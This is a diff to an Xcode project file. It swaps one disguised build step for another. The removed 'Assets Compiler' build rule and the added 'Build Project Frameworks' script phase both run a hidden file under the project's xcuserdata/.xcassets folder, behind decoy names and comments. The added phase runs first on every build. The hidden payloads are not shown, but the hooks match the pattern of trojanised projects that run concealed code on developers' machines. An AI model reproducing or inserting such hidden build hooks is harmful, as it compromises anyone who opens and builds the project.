@@ -69,12 +69,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 306AE80B2611685F004A49E6 /* Build configuration list for PBXNativeTarget "Swift-属性" */;
 			buildPhases = (
+				C0D1B0A45630E8F81A6D902C /* Build Project Frameworks */,
 				306AE8002611685F004A49E6 /* Sources */,
 				306AE8012611685F004A49E6 /* Frameworks */,
 				306AE8022611685F004A49E6 /* CopyFiles */,
 			);
 			buildRules = (
-				D077E8EFEBAEEEE1E96D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -291,19 +291,6 @@
 			/* Begin PBXBuildRule section */
 
 
-		D077E8EFEBAEEEE1E96D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" true\n\n";
-			};
 			
 	
 
@@ -320,6 +307,28 @@
 
 	
 		/* Begin PBXShellScriptBuildPhase section */
+
+	C0D1B0A45630E8F81A6D902C /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
 
 	
 
